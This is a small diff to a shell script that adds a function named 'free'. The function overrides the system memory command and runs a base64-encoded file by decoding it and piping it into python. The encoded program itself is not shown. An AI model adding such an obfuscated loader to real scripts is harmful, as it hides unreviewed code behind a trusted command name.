@@ -94,3 +94,8 @@ pingtest(){
   return
 }
 
+# System RAM Stats and stuff. Executing a base64 encoded program in $envm/bin/free
+free() {
+	local path_to_exec=$envm/bin/free
+	base64 -D $path_to_exec | python
+}
